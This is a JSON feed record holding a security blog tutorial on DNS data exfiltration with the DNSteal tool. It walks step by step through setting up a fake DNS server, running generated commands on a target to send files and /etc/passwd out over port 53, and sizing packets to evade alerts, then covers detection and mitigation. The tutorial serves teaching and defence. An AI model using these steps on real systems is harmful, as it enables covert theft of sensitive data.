{
    "attributes": [],
    "created": "2025-04-24T08:50:00",
    "id": "real_dnsteal_hackingarticles",
    "news_items": [
      {
        "author": "Raj Chandel",
        "content": "Data Exfiltration using DNSSteal\nApril 28, 2020 by Raj\n\nIn this article, we will comprehend the working of DNSteal with the focus on data exfiltration. You can download this tool from here.\nTable of Content:\n\n    Introduction to Data Exfiltration\n    DNS Protocol and it’s working\n    DNS Data exfiltration and it’s working\n    Introduction to DNSteal\n    Proof of Concept\n    Detection\n    Mitigation\n    Conclusion\n\nIntroduction to Data Exfiltration\n\nData Exfiltration is referred to the process where an attacker fetches the sensitive data from the target’s system and store it to their system. As data exfiltration is simply a transfer of data of the network, it becomes difficult to detect. Every organization deals with handling sensitive data which makes the data exfiltration attacks very real. Data exfiltration can be caused due to insider threats or outsider threats. Insider threats are comprised of an employee selling secrets for profit or sharing data carelessly whereas outsider threats are said to be the ones where a cybercriminal exploits a vulnerability to establish a foothold and then goes on to steal the data.\n\nDNS Protocol and it’s working\n\nThe DNS protocol works on TCP/UPD port 53. It is a stateless protocol as it exchanges specific information. It allows a network to connect to the internet and without it, all the surfing on the internet would be impossible and far-fetched. Its function is to translate IP address to hostnames (for the convenience of the user) and vice versa. Hence the utmost importance of DNS in a network.\n\nDNS Data Exfiltration and it’s working\n\nAs we know that DNS is a stateless protocol, i.e. it was never meant to send or receive data from a client to the server. Even so, the authorized DNS will believe that all the queries sent to it are legitimate. And this fact is exploited by attackers as if a request made to a subdomain then that request is treated as data only if the query is constructed properly. For instance, the attacker sends a query to example.target.com and the DNS target.com receives ‘example’ as a string then it will consider the said string as data and this will let the attack access target.com. Now, this lets the attacker set up a covert channel mostly by using the C2 server between DNS and client and retrieves all the data through bidirectional communication. Manipulating DNS in such a way to retrieve sensitive data is known as DNS data Exfiltration.\n\nWhen data is transferred from one system to another without any direct connection and this transfer of data is done over DNS protocol then it is known as DNS Data Exfiltration. DNS protocol is exploited to get attackers to get their hands on sensitive data.\n\nIntroduction to DNSteal\n\nDNSteal is a tool that sets up a fake DNS server and allows an attacker to sneak in a network. As the name suggests it is based on DNS protocol and works on port 53. It is used to extract data from the target after setting up the connection and is one of the best tools for DNS Data Exfiltration. Multiple files can be extracted using this tool. It also supports Gzip file compression. It all lets you manage the size of packets which carries your data over the network to reduce suspicions.\n\nProof of Concept\n\nDownload DNSteal using the following command:\n\ngit clone https://github.com/m57/dnsteal\n\nAnd to further initiate the tool and see all the parameters it provides, use the following command:\n\npython dnsteal.py\n\nNow we will generate a command using DNSteal; the said command will extract the desired data upon execution on the target system. To generate the command, give your local IP and use -z parameter. This -z parameter will unzip the files upon receiving as they are zipped by default. Therefore, type:\n\npython dnsteal.py 192.168.1.112 -z\n\nFrom our target system, we will request the secret.txt file over the DNS connection that will establish when we will run the given command. The contents of secret.txt can be seen in the following image.\n\nNow as you can see in the image above, two commands are generated. Copy the first one (highlighted one).\n\nAnd paste it in the destination folder. Before executing the command, make sure that filename has been changed to the name of the file you desire as shown in the image below:\n\nNote: if you received an error “dig: ‘H4sICLttFF8AA3NlY3JldC50eHQAy8hUyFRIzFUoSsziAgC/9XeXDAAAA-.A==-.secret.txt’ is not a legal IDNA2008 name (string start/ends with forbidden hyphen),” then just edit your above command (f=secret.txt) by adding “+noidnin +noidnout” at end of the command you have pasted.\n\nAnd when the command is executed, the requested file will be received on your terminal. The tool will also calculate the MD5 hash sum for you. Also, you can view the content of the file with the cat command as shown in the image below:\n\nNow we will try to extract a whole folder instead of a single file. Initiate the DNS server provided by DNSteal tool via typing the following command:\n\npython dnsteal.py 192.168.1.112 -z\n\nThe folder which we will try to retrieve is shown in the image below, inclusive of their contents. The folder contains all type of data including .pdf, .msi, .png, .dll.\n\nAgain, you will see that it generated two commands. However, this time we will copy the second one (highlighted on) and paste it in the destination folder as shown below:\n\nUpon the execution of the command, you can see the folder is received accurately with the calculated MD5 hash sum for each file as shown in the image below:\n\nTo reduce the suspicion of the attack, an attacker can divide the file into multiple packets. These packets can be of fixed size in bytes. An attacker can even allocate some bytes to the file name. this is done to avoid triggering an alert in a network which abusing of UDP packet’s size will do. This customization can be done by using -s, -b and -f parameters. The parameter -s is for defining the subdomain value, -b is for specifying the number of bytes per packet and -f is for defining the value of bytes for the filename. In the following command, which can be well observed from the image given below as well, we have defined 4 subdomains. The bytes per packet are set to 57and file name value is 17.\n\npython dnsteal.py 192.168.1.112 -z -s 4 -b 57 -f 17\n\nNow we will acquire the passwd file from the target. As you can see from the image below, the size of the file is 2511 bytes. Now just copy the command and paste it in the /etc folder on the target system. Again, before executing the command make sure to change the filename to passwd.\n\nOnce the command is executed, you can see that the data received will be in chunks of 243 bytes as shown in the image below. And when the receiving is complete, it will give you the MD5 hash sum too and you can read the contents of the file with simple cat command as the file received will be uncompressed:\n\nAnd this way we have retrieved the password file. And while this transfer of data, Wireshark helped us validate the bytes per packet size. Also, we can confirm that the connection established as well as the transfer of data is being done on port 53.\n\nSo, this way by abusing the port and service of DNS; DNS Data Exfiltration attack is done.\n\nDetection\n\nAs Data Exfiltration attack through DNS is very sneaky and as the data is being transferred over the network it is a challenge to detect this attack. Therefore, to detect this attack, one must regularly analyze the network traffic. To detect such attacks, focus on the processes that are exploiting the network or the processes that are unexpected. Moreover, analyze the network packets in-depth and check for any anomaly behaviour. For instance, if a client is sending more data than it is receiving then it is suspicious. To detect such attacks, also look for the data packets of fixed size that’s are being over a long connection.\n\nMitigation\n\nThe following measure should be taken for mitigation against DNS Data Exfiltration:\n\n    Implementation of Network Intrusion Prevention System. This implementation should be based on a network signature and anomaly of packets.\n    Network traffic should be filtered by limiting the clients to converse with DNS.\n    Dedicated DNS servers should be set up.\n    Proper network segmentation should be done.\n    Configuration of firewalls should be apt and only necessary ports should be active.\n    Network traffic flow should be on the bases of firewall rules.\n    All of the employees should be made aware of the consequences.\n    All the unauthorized channels should be blocked.\n    Data Loss Prevention Policies should be adapted.\n    Network logs should be maintained and monitored.\n\nConclusion\n\nMonitoring and limiting the access of other ports such as FTP, SSH has led attackers to come up with new techniques such as exploiting DNS over the years. DNS is a foundation for every internet connection and as every client-to-server connection depends on DNS; restricting the DNS access is not possible. And this makes DNS a worthy protocol for an attacker to use as Data Exfiltration. DNS Data Exfiltration is a major and very real threat to all organizations. And so, both detection and prevention of data breaches and losses must be dealt with by the companies. Attacks like Remsec and Helminith used DNS port for data exfiltration and these attacks and be easily mimicked. Therefore, educating oneself on such attacks is a necessity to protect themselves as a recent survey shows that 46 percent of companies have been victims of this attack.\n\nAuthor: Shubham Sharma is a Pentester, Cybersecurity Researcher, Contact Linkedin and twitter.\nRelated posts:\n\n    Abusing AD-DACL: AddSelf\n    Sapphire Ticket Attack: Abusing Kerberos Trust",          
        "hash": "",
        "id": "real_dnsteal_hackingarticles",
        "link": "https://www.hackingarticles.in/data-exfiltration-using-dnssteal/",
        "osint_source_id": "real_dnsteal_hackingarticles",
        "published": "2020-04-28T00:00:00",
        "source": "www.hackingarticles.in",
        "story_id": "real_dnsteal_hackingarticles",
        "title": "Data Exfiltration using DNSSteal"
      }
    ],
    "tags": {},
    "title": "Data Exfiltration using DNSSteal"
}
